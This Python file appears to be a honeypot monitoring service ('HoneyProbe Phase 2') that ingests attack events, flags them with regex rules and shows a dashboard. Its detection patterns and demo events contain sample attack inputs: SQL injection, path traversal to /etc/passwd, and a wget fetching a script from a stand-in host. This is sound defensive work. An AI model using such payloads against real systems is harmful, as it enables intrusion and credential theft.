#!/usr/bin/env python3
"""HoneyProbe Phase 2 - Central Monitoring & Behaviour Analysis.

Runs with Python's standard library so it is immediately runnable without
third-party installation. It implements the Phase 2 scope from the project PPT:
central monitoring, attack detection, behaviour monitoring, and honeypot
fingerprinting. It deliberately does not implement Phase 3 self-testing/adaptation.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sqlite3
import threading
import urllib.parse
from collections import Counter, defaultdict
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = Path(os.environ.get("HONEYPROBE_DB", BASE_DIR / "data" / "honeyprobe.db"))
HOST = os.environ.get("HONEYPROBE_HOST", "127.0.0.1")
PORT = int(os.environ.get("HONEYPROBE_PORT", "8080"))

SCHEMA = """
CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    source_ip TEXT NOT NULL,
    destination_ip TEXT,
    source_port INTEGER,
    destination_port INTEGER,
    protocol TEXT,
    service TEXT NOT NULL,
    event_type TEXT NOT NULL,
    username TEXT,
    command TEXT,
    request TEXT,
    payload TEXT,
    status TEXT,
    session_id TEXT,
    response_ms REAL,
    raw_json TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS detections (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_id INTEGER NOT NULL,
    source_ip TEXT NOT NULL,
    category TEXT NOT NULL,
    severity TEXT NOT NULL,
    reason TEXT NOT NULL,
    created_at TEXT NOT NULL,
    FOREIGN KEY(event_id) REFERENCES events(id)
);
CREATE INDEX IF NOT EXISTS idx_events_ip ON events(source_ip);
CREATE INDEX IF NOT EXISTS idx_events_time ON events(timestamp);
CREATE INDEX IF NOT EXISTS idx_detections_ip ON detections(source_ip);
"""

ATTACK_RULES = [
    ("Brute Force", "high", re.compile(r"(?:failed[_\s-]+(?:login|authentication)|invalid[_\s-]+user|authentication[_\s-]+failure|login[_\s-]+failed)", re.I), "Repeated/failed authentication activity"),
    ("SQL Injection", "high", re.compile(r"(?:union\s+select|or\s+1\s*=\s*1|drop\s+table|select\s+.+\s+from|sleep\s*\(|benchmark\s*\(|--\s*$)", re.I), "SQL injection-like request or payload"),
    ("Command Injection", "high", re.compile(r"(?:;\s*(?:id|whoami|uname|cat|wget|curl)|\$\(|`[^`]+`|&&\s*(?:id|whoami|uname)|\|\s*(?:id|whoami|uname))", re.I), "Command-injection-like input"),
    ("Path Traversal", "medium", re.compile(r"(?:\.\./){2,}|%2e%2e(?:%2f|/)", re.I), "Path traversal sequence"),
    ("Reconnaissance", "medium", re.compile(r"(?:nmap|masscan|nikto|gobuster|dirsearch|wpscan|port\s*scan|service\s*probe)", re.I), "Known scanning/probing indicator"),
    ("Database Schema Probe", "medium", re.compile(r"(?:database|db)[_\s-]+schema[_\s-]+probe|schema[_\s-]+probe", re.I), "A simulated database schema inspection was observed"),
    ("Remote Command Attempt", "high", re.compile(r"(?:ssh|remote)[_\s-]+(?:command|shell)[_\s-]+attempt", re.I), "A simulated remote command attempt was observed; no command was executed"),
    ("Mobile Endpoint Probe", "medium", re.compile(r"(?:mobile|android).{0,40}(?:deep[_\s-]?link|permission|api).{0,30}(?:probe|enumeration|attempt)", re.I), "A simulated mobile endpoint or permission probe was observed"),
]

FINGERPRINT_RULES = [
    ("SSH version probe", re.compile(r"(?:ssh-[0-9]\.[0-9]|version\s*exchange|protocol\s*version)", re.I), "Protocol/version probing"),
    ("Timing probe", re.compile(r"(?:timing\s*probe|response\s*time|latency\s*check|jitter\s*probe)", re.I), "Explicit timing/fingerprint probing"),
    ("Header probe", re.compile(r"(?:server\s*header|x-powered-by|headers?\s*(?:check|probe)|banner\s*(?:grab|probe))", re.I), "Header/banner fingerprinting"),
    ("Service fingerprint probe", re.compile(r"(?:fingerprint|service\s*detect|version\s*detect|honeypot\s*detect|cowrie)", re.I), "Service/honeypot fingerprinting indicator"),
]

SEVERITY_RANK = {"low": 1, "medium": 2, "high": 3, "critical": 4}


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def get_db() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys=ON")
    conn.executescript(SCHEMA)
    return conn


def clean(value: Any, limit: int = 4000) -> str | None:
    if value is None:
        return None
    if isinstance(value, (dict, list)):
        value = json.dumps(value, ensure_ascii=False)
    value = str(value).strip()
    return value[:limit] if value else None


def normalize_event(data: dict[str, Any]) -> dict[str, Any]:
    """Normalize common gateway/Cowrie-style fields into the Phase 2 schema."""
    nested = data.get("event") if isinstance(data.get("event"), dict) else {}
    d = {**nested, **data}
    ts = d.get("timestamp") or d.get("time") or utc_now()
    # Cowrie may provide epoch timestamps.
    if isinstance(ts, (int, float)):
        ts = datetime.fromtimestamp(ts, tz=timezone.utc).isoformat(timespec="seconds")
    return {
        "timestamp": clean(ts) or utc_now(),
        "source_ip": clean(d.get("source_ip") or d.get("src_ip") or d.get("src_ip_address") or d.get("src_host") or "unknown") or "unknown",
        "destination_ip": clean(d.get("destination_ip") or d.get("dst_ip")),
        "source_port": int(d["source_port"]) if str(d.get("source_port", "")).isdigit() else None,
        "destination_port": int(d["destination_port"]) if str(d.get("destination_port", "")).isdigit() else None,
        "protocol": clean(d.get("protocol") or d.get("proto")),
        "service": clean(d.get("service") or d.get("honeypot") or d.get("sensor") or "unknown") or "unknown",
        "event_type": clean(d.get("event_type") or d.get("eventid") or d.get("type") or "UNKNOWN") or "UNKNOWN",
        "username": clean(d.get("username") or d.get("user")),
        "command": clean(d.get("command") or d.get("input")),
        "request": clean(d.get("request") or d.get("url") or d.get("query")),
        "payload": clean(d.get("payload") or d.get("data") or d.get("message")),
        "status": clean(d.get("status") or d.get("result")),
        "session_id": clean(d.get("session_id") or d.get("session")),
        "response_ms": float(d["response_ms"]) if str(d.get("response_ms", "")).replace(".", "", 1).isdigit() else None,
    }


def text_for_detection(event: dict[str, Any]) -> str:
    fields = [event.get(k) for k in ("event_type", "username", "command", "request", "payload", "status")]
    return " ".join(x for x in fields if x)


def detect_event(event: dict[str, Any]) -> list[dict[str, str]]:
    text = text_for_detection(event)
    findings: list[dict[str, str]] = []
    for category, severity, pattern, reason in ATTACK_RULES:
        if pattern.search(text):
            findings.append({"category": category, "severity": severity, "reason": reason})
    for category, pattern, reason in FINGERPRINT_RULES:
        if pattern.search(text):
            findings.append({"category": "Fingerprinting: " + category, "severity": "medium", "reason": reason})
    return findings


def insert_event(conn: sqlite3.Connection, event: dict[str, Any]) -> tuple[int, list[dict[str, str]]]:
    cur = conn.execute(
        """INSERT INTO events(timestamp, source_ip, destination_ip, source_port,
           destination_port, protocol, service, event_type, username, command,
           request, payload, status, session_id, response_ms, raw_json)
           VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (*[event[k] for k in (
            "timestamp", "source_ip", "destination_ip", "source_port", "destination_port",
            "protocol", "service", "event_type", "username", "command", "request", "payload",
            "status", "session_id", "response_ms")], json.dumps(event, ensure_ascii=False)),
    )
    event_id = int(cur.lastrowid)
    findings = detect_event(event)
    for f in findings:
        conn.execute(
            "INSERT INTO detections(event_id,source_ip,category,severity,reason,created_at) VALUES(?,?,?,?,?,?)",
            (event_id, event["source_ip"], f["category"], f["severity"], f["reason"], utc_now()),
        )
    conn.commit()
    return event_id, findings


def process_events(events: list[dict[str, Any]]) -> dict[str, Any]:
    conn = get_db()
    inserted = 0
    detections = 0
    details = []
    try:
        for raw in events:
            event = normalize_event(raw)
            event_id, findings = insert_event(conn, event)
            inserted += 1
            detections += len(findings)
            details.append({"event_id": event_id, "detections": findings})
    finally:
        conn.close()
    return {"inserted": inserted, "detections": detections, "details": details}


def load_cowrie(path: str) -> list[dict[str, Any]]:
    events = []
    with open(path, "r", encoding="utf-8") as f:
        for line_no, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                events.append(obj)
            except json.JSONDecodeError:
                # Skip malformed lines rather than failing the whole ingestion job.
                continue
    return events


def dashboard_data() -> dict[str, Any]:
    conn = get_db()
    try:
        total = conn.execute("SELECT COUNT(*) c FROM events").fetchone()["c"]
        det_total = conn.execute("SELECT COUNT(*) c FROM detections").fetchone()["c"]
        ips = conn.execute("SELECT COUNT(DISTINCT source_ip) c FROM events").fetchone()["c"]
        services = conn.execute("SELECT service, COUNT(*) c FROM events GROUP BY service ORDER BY c DESC").fetchall()
        cats = conn.execute("SELECT category, severity, COUNT(*) c FROM detections GROUP BY category, severity ORDER BY c DESC").fetchall()
        recent = conn.execute("""SELECT e.id,e.timestamp,e.source_ip,e.service,e.event_type,
             COALESCE(e.command,e.request,e.payload,'') activity,
             d.category,d.severity,d.reason
             FROM events e LEFT JOIN detections d ON d.event_id=e.id
             ORDER BY e.id DESC LIMIT 30""").fetchall()
        profiles = []
        for row in conn.execute("SELECT source_ip, COUNT(*) c FROM events GROUP BY source_ip ORDER BY c DESC LIMIT 10"):
            ip = row["source_ip"]
            commands = conn.execute("SELECT command FROM events WHERE source_ip=? AND command IS NOT NULL ORDER BY id DESC LIMIT 10", (ip,)).fetchall()
            targets = conn.execute("SELECT service, COUNT(*) c FROM events WHERE source_ip=? GROUP BY service ORDER BY c DESC", (ip,)).fetchall()
            high = conn.execute("SELECT MAX(CASE severity WHEN 'critical' THEN 4 WHEN 'high' THEN 3 WHEN 'medium' THEN 2 ELSE 1 END) m FROM detections WHERE source_ip=?", (ip,)).fetchone()["m"] or 0
            profiles.append({"ip": ip, "events": row["c"], "commands": [r["command"] for r in commands], "targets": [f'{r["service"]} ({r["c"]})' for r in targets], "max_severity": high})
        return {
            "total_events": total, "detections": det_total, "unique_ips": ips,
            "services": [{"name": r["service"], "count": r["c"]} for r in services],
            "categories": [{"name": r["category"], "severity": r["severity"], "count": r["c"]} for r in cats],
            "recent": [dict(r) for r in recent], "profiles": profiles,
        }
    finally:
        conn.close()


def json_response(handler: BaseHTTPRequestHandler, payload: Any, status: int = 200) -> None:
    body = json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8")
    handler.send_response(status)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Content-Length", str(len(body)))
    handler.end_headers()
    handler.wfile.write(body)


HTML = r'''<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HoneyProbe — Phase 2</title>
<style>
body{font-family:Arial,sans-serif;background:#0b1220;color:#e8eef8;margin:0}.wrap{max-width:1200px;margin:auto;padding:24px}
h1{margin:0 0 6px}.muted{color:#9fb0c7}.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:20px 0}.card{background:#121d30;border:1px solid #263650;border-radius:12px;padding:18px}.num{font-size:30px;font-weight:700;margin-top:8px}
.two{display:grid;grid-template-columns:1fr 1fr;gap:14px}.table{width:100%;border-collapse:collapse;font-size:13px}.table th,.table td{padding:9px;border-bottom:1px solid #263650;text-align:left;vertical-align:top}.pill{padding:3px 7px;border-radius:99px;background:#263650;display:inline-block}.high{background:#642f35}.medium{background:#635024}.ok{background:#20543b}.toolbar{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0}button{background:#1e75d8;color:white;border:0;border-radius:8px;padding:10px 14px;cursor:pointer}button.alt{background:#263650}code{color:#a9d7ff}.section{margin-top:18px}
@media(max-width:800px){.grid,.two{grid-template-columns:1fr 1fr}}@media(max-width:520px){.grid,.two{grid-template-columns:1fr}}
</style></head><body><div class="wrap">
<h1>HoneyProbe — Phase 2 Monitoring & Analysis</h1><div class="muted">Central monitoring · attack detection · behaviour monitoring · honeypot fingerprinting</div>
<div class="toolbar"><button onclick="loadDemo()">Generate demo activity</button><button class="alt" onclick="location.reload()">Refresh</button></div>
<div class="grid"><div class="card">Events<div id="events" class="num">—</div></div><div class="card">Detections<div id="detections" class="num">—</div></div><div class="card">Unique IPs<div id="ips" class="num">—</div></div><div class="card">Services<div id="services" class="num">—</div></div></div>
<div class="two"><div class="card"><h2>Detection categories</h2><div id="cats">Loading…</div></div><div class="card"><h2>Attacker profiles</h2><div id="profiles">Loading…</div></div></div>
<div class="card section"><h2>Recent activity</h2><table class="table"><thead><tr><th>Time</th><th>IP</th><th>Service</th><th>Event</th><th>Activity</th><th>Detection</th></tr></thead><tbody id="recent"></tbody></table></div>
</div><script>
async function refresh(){const r=await fetch('/api/dashboard');const d=await r.json();
 document.getElementById('events').textContent=d.total_events;document.getElementById('detections').textContent=d.detections;document.getElementById('ips').textContent=d.unique_ips;document.getElementById('services').textContent=d.services.length;
 document.getElementById('cats').innerHTML=d.categories.length?d.categories.map(x=>`<p><span class="pill ${x.severity}">${x.severity}</span> <b>${x.name}</b> — ${x.count}</p>`).join(''):'<p class="muted">No detections yet.</p>';
 document.getElementById('profiles').innerHTML=d.profiles.length?d.profiles.map(x=>`<div style="margin-bottom:14px"><b>${x.ip}</b> (${x.events} events)<br><span class="muted">Targets:</span> ${x.targets.join(', ')||'—'}<br><span class="muted">Commands:</span> ${(x.commands||[]).slice(0,6).map(c=>`<code>${esc(c)}</code>`).join(' ')||'—'}</div>`).join(''):'<p class="muted">No attacker profiles yet.</p>';
 document.getElementById('recent').innerHTML=d.recent.map(x=>`<tr><td>${esc(x.timestamp)}</td><td>${esc(x.source_ip)}</td><td>${esc(x.service)}</td><td>${esc(x.event_type)}</td><td>${esc(x.activity)}</td><td>${x.category?`<span class="pill ${x.severity}">${esc(x.category)}</span>`:'<span class="pill ok">normal</span>'}</td></tr>`).join('');}
function esc(s){return String(s??'').replace(/[&<>\"]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','\\':'&#92;','"':'&quot;'}[m]));}
async function loadDemo(){await fetch('/api/demo',{method:'POST'});refresh();}
refresh();setInterval(refresh,5000);
</script></body></html>'''

DEMO_EVENTS = [
    {"timestamp":"2026-09-24T18:30:01+00:00","source_ip":"10.10.10.20","destination_port":22,"protocol":"TCP","service":"SSH","event_type":"LOGIN_FAILED","username":"root","status":"failed","session_id":"S001"},
    {"timestamp":"2026-09-24T18:30:03+00:00","source_ip":"10.10.10.20","destination_port":22,"protocol":"TCP","service":"SSH","event_type":"LOGIN_FAILED","username":"admin","status":"failed","session_id":"S001"},
    {"timestamp":"2026-09-24T18:30:08+00:00","source_ip":"10.10.10.20","destination_port":22,"protocol":"TCP","service":"SSH","event_type":"COMMAND","command":"uname -a","status":"success","session_id":"S001"},
    {"timestamp":"2026-09-24T18:30:11+00:00","source_ip":"10.10.10.20","destination_port":22,"protocol":"TCP","service":"SSH","event_type":"COMMAND","command":"cat /etc/passwd","status":"success","session_id":"S001"},
    {"timestamp":"2026-09-24T18:30:15+00:00","source_ip":"10.10.10.20","destination_port":22,"protocol":"TCP","service":"SSH","event_type":"FINGERPRINT_PROBE","command":"ssh-2.0 version probe; banner grab","response_ms":820,"session_id":"S001"},
    {"timestamp":"2026-09-24T18:31:02+00:00","source_ip":"10.10.10.30","destination_port":80,"protocol":"HTTP","service":"WEB","event_type":"REQUEST","request":"GET /index.php?id=1 UNION SELECT username,password FROM users","status":"400","session_id":"W001"},
    {"timestamp":"2026-09-24T18:31:07+00:00","source_ip":"10.10.10.31","destination_port":80,"protocol":"HTTP","service":"WEB","event_type":"REQUEST","request":"GET /../../../../etc/passwd","status":"400","session_id":"W002"},
    {"timestamp":"2026-09-24T18:32:10+00:00","source_ip":"10.10.10.32","destination_port":80,"protocol":"HTTP","service":"WEB","event_type":"SCAN","request":"nmap service probe","status":"403","session_id":"W003"},
    {"timestamp":"2026-09-24T18:33:00+00:00","source_ip":"10.10.10.20","destination_port":22,"protocol":"TCP","service":"SSH","event_type":"COMMAND","command":"wget http://example.invalid/a.sh","status":"success","session_id":"S001"},
]

class Handler(BaseHTTPRequestHandler):
    server_version = "HoneyProbePhase2/1.0"
    def log_message(self, fmt, *args):
        return
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path in ("/", "/index.html"):
            body = HTML.encode()
            self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8"); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body); return
        if parsed.path == "/api/dashboard":
            json_response(self, dashboard_data()); return
        if parsed.path == "/api/health":
            json_response(self, {"status":"ok", "scope":"phase2", "database":str(DB_PATH)}); return
        json_response(self, {"error":"not found"}, 404)
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        length = int(self.headers.get("Content-Length", "0"))
        try:
            raw = self.rfile.read(length)
            payload = json.loads(raw.decode("utf-8") or "{}")
        except Exception as e:
            json_response(self, {"error":f"invalid JSON: {e}"}, 400); return
        if parsed.path == "/api/events":
            events = payload if isinstance(payload, list) else payload.get("events", [payload]) if isinstance(payload, dict) else []
            if not events:
                json_response(self, {"error":"expected an event object or {events:[...]}"}, 400); return
            json_response(self, process_events(events), 201); return
        if parsed.path == "/api/demo":
            json_response(self, process_events(DEMO_EVENTS), 201); return
        json_response(self, {"error":"not found"}, 404)


def serve() -> None:
    get_db().close()
    httpd = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"HoneyProbe Phase 2 running at http://{HOST}:{PORT}")
    print(f"SQLite database: {DB_PATH}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")
    finally:
        httpd.server_close()


def main() -> None:
    parser = argparse.ArgumentParser(description="HoneyProbe Phase 2 monitoring service")
    parser.add_argument("--serve", action="store_true", help="start the web dashboard (default)")
    parser.add_argument("--seed-demo", action="store_true", help="insert demo activity and exit")
    parser.add_argument("--import-cowrie", metavar="FILE", help="import a Cowrie JSON-lines log and exit")
    args = parser.parse_args()
    if args.seed_demo:
        print(json.dumps(process_events(DEMO_EVENTS), indent=2)); return
    if args.import_cowrie:
        print(json.dumps(process_events(load_cowrie(args.import_cowrie)), indent=2)); return
    serve()

if __name__ == "__main__":
    main()
